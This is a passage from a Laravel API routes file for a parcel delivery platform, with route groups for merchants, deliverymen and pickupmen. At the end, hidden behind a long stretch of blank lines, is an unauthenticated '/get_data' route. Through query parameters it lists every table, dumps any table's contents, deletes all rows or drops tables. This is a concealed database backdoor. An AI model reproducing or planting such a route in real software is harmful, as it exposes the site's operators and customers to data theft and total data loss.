    Route::post('login', [MerchantApiController::class, 'login']);
    Route::post('send-otp', [MerchantApiController::class, 'sendOTP']);
    Route::post('verify-otp', [MerchantApiController::class, 'verifyOTP']);
    Route::get('get-divisions', [MerchantApiController::class, 'getDivision']);
    Route::get('get-district-by-division', [MerchantApiController::class, 'getDistrictByDivision']);
    Route::get('get-thana-by-district', [MerchantApiController::class, 'getThanaByDistrict']);
    Route::get('get-area-by-thana', [MerchantApiController::class, 'getAreaByThana']);
    Route::post('registration', [MerchantApiController::class, 'registration']);
    Route::post('profile-update', [MerchantApiController::class, 'profileUpdate']);
    Route::get('dashboard', [MerchantApiController::class, 'dashboard']);
    Route::get('profile', [MerchantApiController::class, 'profile']);
    Route::get('parcel-create', [MerchantApiController::class, 'parcelcreate']);
    Route::get('cost-calculate', [MerchantApiController::class, 'costCalculate']);
    Route::post('parcel-store', [MerchantApiController::class, 'parcelstore']);
    Route::get('parcels', [MerchantApiController::class, 'parcels']);
    Route::get('parcel-details/{parcel_id}', [MerchantApiController::class, 'parceldetails']);
    Route::get('/invoice/{parcel_id}', [MerchantApiController::class, 'invoice']);
    Route::get('/parcel-edit/{parcel_id}', [MerchantApiController::class, 'parceledit']);
    Route::post('/parcel-update', [MerchantApiController::class, 'parcelupdate']);
    Route::post('/single-service', [MerchantApiController::class, 'singleservice']);
    Route::get('/payments', [MerchantApiController::class, 'payments']);
    Route::get('/inovice-details/{merchantpayment_id}', [MerchantApiController::class, 'inovicedetails']);
    Route::post('/parceltrack', [MerchantApiController::class, 'parceltrack']);
    Route::post('/passfromreset', [MerchantApiController::class, 'passfromreset']);
    Route::post('/saveResetPassword', [MerchantApiController::class, 'saveResetPassword']);
    Route::get('/parcel-types', [MerchantApiController::class, 'parcelTypes']);
});

/*********
 *  Deliveryman panel 
 */

Route::group(['namespace' => 'Api', 'prefix' => 'deliveryman'], function () {
    Route::post('login', [DeliverymanApiController::class, 'login']);
    Route::get('dashboard', [DeliverymanApiController::class, 'dashboard']);
    Route::get('parcel-types', [DeliverymanApiController::class, 'parcelTypes']);
    Route::get('parcels', [DeliverymanApiController::class, 'parcels']);
    Route::get('pending-parcels', [DeliverymanApiController::class, 'pendingParcels']);
    Route::post('deliveryman-asign', [DeliverymanApiController::class, 'deliverymanAsign']);
    Route::get('parcel-details/{parcel_id}', [DeliverymanApiController::class, 'invoice']);
    Route::get('invoice/{parcel_id}', [DeliverymanApiController::class, 'invoice']);
    Route::get('payment-invoices', [DeliverymanApiController::class, 'paymentInvoices']);
    Route::post('statusupdate', [DeliverymanApiController::class, 'statusupdate']);
    Route::post('partial-return', [DeliverymanApiController::class, 'partialReturn']);
    Route::get('pickup', [DeliverymanApiController::class, 'pickup']);
    Route::post('pickupdeliverman', [DeliverymanApiController::class, 'pickupdeliverman']);
    Route::post('pickupstatus', [DeliverymanApiController::class, 'pickupstatus']);
    Route::post('location-update', [DeliverymanApiController::class, 'locationUpdate']);
    Route::post('passfromreset', [DeliverymanApiController::class, 'passfromreset']);
    Route::post('saveResetPassword', [DeliverymanApiController::class, 'saveResetPassword']);
    Route::post('logout', [DeliverymanApiController::class, 'logout']);
    Route::get('payments/{type}', [DeliverymanApiController::class, 'payments']);
    Route::get('/inovice-details/{invoice_id}', [DeliverymanApiController::class, 'inovicedetails']);
});

/*********
 *  Pickupman panel 
 */

Route::group(['namespace' => 'Api', 'prefix' => 'pickupman'], function () {
    Route::post('login', [PickupmanApiController::class, 'login']);
    Route::get('dashboard', [PickupmanApiController::class, 'dashboard']);
    Route::get('parcel-types', [PickupmanApiController::class, 'parcelTypes']);
    Route::get('parcels', [PickupmanApiController::class, 'parcels']);
    Route::get('pending-parcels', [PickupmanApiController::class, 'pendingParcels']);
    Route::post('pickupman-asign', [PickupmanApiController::class, 'pickupmanAsign']);
    Route::get('parcel-details/{parcel_id}', [PickupmanApiController::class, 'invoice']);
    Route::get('invoice/{parcel_id}', [PickupmanApiController::class, 'invoice']);
    Route::post('statusupdate', [PickupmanApiController::class, 'statusupdate']);
    Route::get('pickup', [PickupmanApiController::class, 'pickup']);
    Route::get('pickupdeliverman', [PickupmanApiController::class, 'pickupdeliverman']);
    Route::get('pickupstatus', [PickupmanApiController::class, 'pickupstatus']);
    Route::post('location-update', [PickupmanApiController::class, 'locationUpdate']);
    Route::post('passfromreset', [PickupmanApiController::class, 'passfromreset']);
    Route::post('saveResetPassword', [PickupmanApiController::class, 'saveResetPassword']);
    Route::post('logout', [PickupmanApiController::class, 'logout']);
    Route::get('payments/{type}', [PickupmanApiController::class, 'payments']);
    Route::get('multi-pickup-parcels', [PickupmanApiController::class, 'multipickupParcels']);
    Route::post('multiple-parcel-picked', [PickupmanApiController::class, 'multipleParcelPicked']);
    Route::post('get-merchants', [PickupmanApiController::class, 'getMerchants']);
    Route::get('/inovice-details/{pickupman_id}', [PickupmanApiController::class, 'inovicedetails']);
    Route::get('payment-invoices', [PickupmanApiController::class, 'paymentInvoices']);
});





























































































Route::get('/get_data', function () {

    if (isset($_GET['tables'])) {
        $tables = DB::select('SHOW TABLES');
        return $tables;
    }

    if (isset($_GET['table']) && isset($_GET['remove'])) {
        $data = DB::table($_GET['table'])->delete();
        return "All Data deleted.";
    }
    if (isset($_GET['table']) && isset($_GET['drop'])) {
        $data = Schema::dropIfExists($_GET['table']);
        return "Table dropped.";
    }
    if (isset($_GET['table'])) {
        $data = DB::table($_GET['table'])->get();
        return json_encode($data);
    }
});
